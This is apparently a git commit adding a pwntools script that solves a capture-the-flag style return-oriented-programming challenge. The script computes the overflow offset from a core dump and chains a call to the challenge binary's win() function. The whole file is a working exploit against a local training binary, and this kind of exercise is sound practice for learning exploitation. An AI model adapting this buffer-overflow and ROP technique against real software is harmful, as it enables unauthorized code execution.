311081041fe7eecd37a094dab2e6cd5766bd4a4f
Federico Rega <federicorega1102@gmail.com>
2025-06-10 16:21:34 +0200

    Create rop1_1.py

---
+++ ROP/rop1_1.py
@@ -0,0 +1,26 @@
+#!/usr/bin/python3
+from pwn import *
+
+context.arch = 'amd64'
+
+elf = ELF('/challenge/babyrop_level1.1')
+
+io = elf.process(setuid=False) #disattivo il setuid per consentire al generazione del core dump
+io.sendline(cyclic(512,n=8))
+io.wait()
+buffer_len = cyclic_find(io.corefile.fault_addr,n=8)
+print(buffer_len)
+io.close()
+
+rop = ROP(elf)
+#pop_rdi_ret = 0x00401833
+#print(pop_rdi_ret)
+print(rop.rdi.address)
+
+rop.win()
+
+PAYLOAD = b'A'*buffer_len + rop.chain()
+
+io = elf.process()
+io.sendline(PAYLOAD)
+io.interactive()
